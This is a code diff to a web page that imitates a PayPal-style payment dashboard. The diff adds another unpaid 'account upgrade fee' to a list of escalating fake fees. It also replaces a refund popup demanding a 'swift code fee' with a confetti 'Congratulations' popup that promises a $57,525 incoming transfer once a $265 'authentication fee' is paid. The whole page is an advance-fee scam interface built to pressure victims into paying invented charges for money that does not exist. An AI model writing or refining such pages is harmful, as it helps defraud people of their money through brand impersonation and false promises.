@@ -211,7 +211,8 @@ function simulatePaymentProgress() {
     {id: 'delay-fee', text: 'Delay fee', amount: '$15.25', status: 'paid'},
     {id: 'clearance-fee', text: 'Clearance fee', amount: '$29.99', status: 'paid'},
     {id: 'withdrawal-fee', text: 'Withdrawal fee', amount: '$250.00', status: 'paid'},
-    {id: 'documentation-verification-fee', text: 'verification-fee', amount: '$250.00', status: 'unpaid'}
+    {id: 'documentation-verification-fee', text: 'verification-fee', amount: '$250.00', status: 'paid'},
+    {id: 'account-upgrade-fee', text: 'upgrade-fee', amount: '$250.00', status: 'unpaid'}
 
   ];
   
@@ -421,7 +422,7 @@ function simulatePaymentProgress() {
       <div class="bg-white rounded-xl shadow-sm overflow-hidden">
 
 <!-- Refund – Fees Returned -->
-    <button onclick="showRefundOverlay()" class="w-full text-left p-3 sm:p-4 flex items-center justify-between border-b border-gray-100 hover:bg-gray-50 active:bg-gray-100 transition">
+    <button onclick="showCongratsOverlay()" class="w-full text-left p-3 sm:p-4 flex items-center justify-between border-b border-gray-100 hover:bg-gray-50 active:bg-gray-100 transition">
       <div class="flex items-center space-x-2 sm:space-x-3 min-w-0">
         <div class="bg-green-100 text-green-600 rounded-full w-8 h-8 sm:w-10 sm:h-10 flex-shrink-0 flex items-center justify-center">
           <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 sm:h-5 sm:w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -445,7 +446,7 @@ function simulatePaymentProgress() {
 
 
         <!-- Incoming Payment with Pending Status -->
-        <button onclick="showIncomingPaymentOverlay()" 
+        <button onclick="showCongratsOverlay()" 
           class="w-full text-left p-3 sm:p-4 flex items-center justify-between border-b border-gray-100 hover:bg-gray-50 active:bg-gray-100 transition">
 
           <div class="flex items-center space-x-2 sm:space-x-3 min-w-0">
@@ -640,12 +641,24 @@ function simulatePaymentProgress() {
   </div>
 
   <div id="documentation-verification-fee" class="fee-status">
+    <div class="fee-item paid-fee">
+      <div class="check-icon">
+        <i class="fas fa-check"></i>
+      </div>
+    <div class="fee-text truncate max-w-full text-sm sm:text-base md:text-lg">
+      BOFAUS3*******<span class="fee-amount"></span>
+    </div>
+      <span class="paid-text">PAID</span>
+    </div>
+  </div>
+
+  <div id="account-upgrade-fee" class="fee-status">
     <div class="fee-item paid-fee" style="border-left-color: red;">
       <div class="cross-icon">
         <i class="fas fa-times"></i>
       </div>
     <div class="fee-text truncate max-w-full text-sm sm:text-base md:text-lg">
-      BOFAUS3*******<span class="fee-amount"></span>
+      Account activation fee<span class="fee-amount"></span>
     </div>
       <span class="unpaid-text">UNPAID</span>
     </div>
@@ -712,86 +725,243 @@ function simulatePaymentProgress() {
     </div>
   </div>
 
-  <!-- Tax Fee Overlay
-  <div id="overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-20 flex items-center justify-center p-4">
-    <div class="bg-white rounded-xl max-w-md w-full p-6">
-      <div class="flex justify-between items-center mb-4">
-        <h3 class="text-lg font-semibold">Action Required</h3>
-        <button onclick="hideTaxFeeOverlay()" class="text-gray-500 hover:text-gray-700">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width极2" d="M6 18L18 6M6 6l12 12" />
-          </svg>
-        </button>
-      </div>
-        <p class="text-gray-700 mb-6">
-          $650 OTP License code is required to complete the deposit.
-        </p>
-      <div class="flex space-x-3">
-        <button onclick="hideTaxFeeOverlay()" class="flex-1 py-2 border border-gray-300 rounded-lg text-gray-700 font-medium">
-          Cancel
-        </button>
-        <button class="flex-1 py-2 bg-paypal-blue text-white rounded-lg font-medium">
-          Pay Fee Now
-        </button>
-      </div>
-    </div>
-  </div> -->
 
-    <!-- Refund Overlay -->
-<div id="refund-overlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-20 flex items-center justify-center p-4">
-  <div class="bg-white rounded-xl max-w-md w-full p-6">
-    <div class="flex justify-between items-center mb-4">
-      <h3 class="text-lg font-semibold">Refund Status</h3>
-      <button onclick="hideRefundOverlay()" class="text-gray-500 hover:text-gray-700">
-        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+
+<!-- Congratulations Overlay -->
+<div id="congrats-overlay" class="hidden fixed inset-0 bg-black bg-opacity-60 z-50 flex items-center justify-center p-4">
+  <!-- Confetti container (behind the dialog) -->
+  <div class="absolute inset-0 overflow-hidden z-0">
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+    <div class="confetti"></div>
+  </div>
+  
+  <!-- Dialog Content -->
+  <div class="bg-white rounded-xl max-w-sm w-full p-5 relative z-10 shadow-xl transform transition-transform duration-300 scale-95 animate-scale">
+    <div class="flex justify-end mb-1">
+      <button onclick="hideCongratsOverlay()" class="text-gray-500 hover:text-gray-700 transition-colors p-1 rounded-full hover:bg-gray-100">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
         </svg>
       </button>
     </div>
     
-    <div class="py-4">
-      <div class="flex items-center justify-center mb-4">
-        <div class="bg-yellow-100 text-yellow-600 rounded-full w-16 h-16 flex items-center justify-center">
-          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+    <div class="py-2 text-center">
+      <!-- PayPal-style success icon with subtle animation -->
+      <div class="flex justify-center mb-4">
+        <div class="w-16 h-16 rounded-full bg-blue-50 flex items-center justify-center border border-blue-100 animate-pulse">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-blue-500" viewBox="0 0 20 20" fill="currentColor">
+            <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd" />
           </svg>
         </div>
       </div>
       
-      <p class="text-gray-700 mb-4 text-center">
-        A refund of <span class="font-semibold">$2,260.00</span> is currently pending.
-      </p>
+      <h3 class="text-xl font-bold text-gray-800 mb-3">Congratulations</h3>
       
-      <div class="p-4 bg-yellow-50 text-yellow-700 rounded-md text-center border border-yellow-200 mb-4">
-        <i class="fas fa-exclamation-circle mr-2"></i>
-        This refund will remain pending until the swift code fee of <span class="font-semibold">$425.00</span> is paid.
+      <div class="bg-gradient-to-r from-blue-50 to-indigo-50 rounded-lg py-3 px-4 mb-4 text-center border border-blue-100 shadow-sm">
+        <p class="text-blue-800 font-medium">
+          <span class="text-xl block">$57,525.00</span>
+          <span class="text-xs font-normal">Incoming transfer</span>
+        </p>
       </div>
       
-      <p class="text-sm text-gray-600 mb-6 text-center">
-        Once the swift code fee is settled, your refund will be processed immediately.
-      </p>
+    <p class="text-gray-600 mb-4 text-sm leading-relaxed px-1">
+      Congratulations, your account is eligible to receive this transfer. To complete the deposit, 
+      a one-time authentication fee of $265 is required to verify and securely credit the transaction to your balance.
+    </p>
+
+      
+      <div class="bg-gray-50 rounded-lg p-3 mb-4 text-left text-xs border border-gray-200">
+        <div class="flex justify-between items-center mb-2">
+        </div>
+        <div class="flex justify-between items-center">
+          <span class="text-gray-600">Status</span>
+          <span class="px-2 py-1 bg-blue-100 text-blue-800 text-xs rounded-full font-medium">Processing...</span>
+        </div>
+      </div>
       
       <div class="flex space-x-3">
-        <button onclick="hideRefundOverlay()" class="flex-1 py-3 border border-gray-300 rounded-lg text-gray-700 font-medium hover:bg-gray-50 transition">
-          Close
+        <button onclick="hideCongratsOverlay()" class="flex-1 py-2.5 px-3 border border-gray-300 rounded-lg text-gray-700 text-sm font-medium hover:bg-gray-50 transition-colors duration-200">
+          Cancel
         </button>
-        <button onclick="hideRefundOverlay(); showIncomingPaymentOverlay();" class="flex-1 py-3 bg-paypal-blue text-white rounded-lg font-medium hover:bg-blue-700 transition">
-          Pay Now
+        <button onclick="proceedToPayment()" class="flex-1 py-2.5 px-3 bg-blue-600 border border-transparent rounded-lg text-white text-sm font-medium hover:bg-blue-700 transition-colors duration-200 shadow-sm">
+          Pay Fee
         </button>
       </div>
+      
+      <p class="text-xs text-gray-500 mt-3">
+        Funds will be credited after verification
+      </p>
     </div>
   </div>
 </div>
 
+<style>
+  .confetti {
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    opacity: 0.8;
+    border-radius: 2px;
+    animation: confetti-fall 5s linear infinite;
+    z-index: 0;
+  }
+  
+  .confetti:nth-child(1) {
+    left: 5%;
+    background-color: #0070BA;
+    animation-delay: 0s;
+    animation-duration: 6s;
+  }
+  
+  .confetti:nth-child(2) {
+    left: 15%;
+    background-color: #009CDE;
+    animation-delay: 1s;
+    animation-duration: 5s;
+  }
+  
+  .confetti:nth-child(3) {
+    left: 25%;
+    background-color: #003087;
+    animation-delay: 0.5s;
+    animation-duration: 7s;
+  }
+  
+  .confetti:nth-child(4) {
+    left: 35%;
+    background-color: #FFC439;
+    animation-delay: 2s;
+    animation-duration: 6s;
+  }
+  
+  .confetti:nth-child(5) {
+    left: 45%;
+    background-color: #0070BA;
+    animation-delay: 1.5s;
+    animation-duration: 5.5s;
+  }
+  
+  .confetti:nth-child(6) {
+    left: 55%;
+    background-color: #009CDE;
+    animation-delay: 0.8s;
+    animation-duration: 6.5s;
+  }
+  
+  .confetti:nth-child(7) {
+    left: 65%;
+    background-color: #003087;
+    animation-delay: 2.5s;
+    animation-duration: 5s;
+  }
+  
+  .confetti:nth-child(8) {
+    left: 75%;
+    background-color: #FFC439;
+    animation-delay: 1.2s;
+    animation-duration: 7s;
+  }
+  
+  .confetti:nth-child(9) {
+    left: 85%;
+    background-color: #0070BA;
+    animation-delay: 0.3s;
+    animation-duration: 6s;
+  }
+  
+  .confetti:nth-child(10) {
+    left: 95%;
+    background-color: #009CDE;
+    animation-delay: 2.2s;
+    animation-duration: 5.8s;
+  }
+  
+  .confetti:nth-child(11) {
+    left: 10%;
+    background-color: #003087;
+    animation-delay: 1.8s;
+    animation-duration: 6.2s;
+  }
+  
+  .confetti:nth-child(12) {
+    left: 90%;
+    background-color: #FFC439;
+    animation-delay: 0.7s;
+    animation-duration: 5.7s;
+  }
+  
+  @keyframes confetti-fall {
+    0% {
+      transform: translateY(-100vh) rotate(0deg) scale(1);
+      opacity: 0.8;
+    }
+    80% {
+      opacity: 0.6;
+    }
+    100% {
+      transform: translateY(100vh) rotate(720deg) scale(1.2);
+      opacity: 0;
+    }
+  }
+  
+  @keyframes scale {
+    0% {
+      transform: scale(0.9);
+      opacity: 0;
+    }
+    100% {
+      transform: scale(1);
+      opacity: 1;
+    }
+  }
+  
+  .animate-scale {
+    animation: scale 0.3s ease-out forwards;
+  }
+  
+  /* Responsive adjustments */
+  @media (max-width: 640px) {
+    #congrats-overlay .rounded-xl {
+      margin: 1rem;
+    }
+    
+    #congrats-overlay .p-5 {
+      padding: 1.25rem;
+    }
+    
+    .confetti {
+      width: 8px;
+      height: 8px;
+    }
+  }
+</style>
 
-  <script>
-    function showRefundOverlay() {
-  document.getElementById('refund-overlay').classList.remove('hidden');
-}
 
-function hideRefundOverlay() {
-  document.getElementById('refund-overlay').classList.add('hidden');
-}
-  </script>
+
+
+<script>
+  function showCongratsOverlay() {
+    document.getElementById('congrats-overlay').classList.remove('hidden');
+  }
+
+  function hideCongratsOverlay() {
+    document.getElementById('congrats-overlay').classList.add('hidden');
+  }
+</script>
+
+
+
+
+
 </body>
 </html>
